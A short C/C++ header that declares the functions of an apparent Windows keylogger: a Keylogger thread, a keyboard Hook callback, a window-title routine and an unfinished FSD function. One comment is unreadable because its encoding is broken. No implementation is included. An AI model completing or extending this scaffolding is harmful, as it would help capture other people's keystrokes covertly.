#pragma once
#define _CRT_SECURE_NO_WARNINGS
#include "stdafx.h"

using namespace std;

DWORD WINAPI Keylogger(LPVOID lpParm);
LRESULT WINAPI Hook(int nCode, WPARAM wParam, LPARAM lParam);
void wintitle();

// TBD
void FSD();
// �α� ������ �̸��Ϸ� �����ϱ��� �ִ� ���� �������� �����ִ� �Լ�..

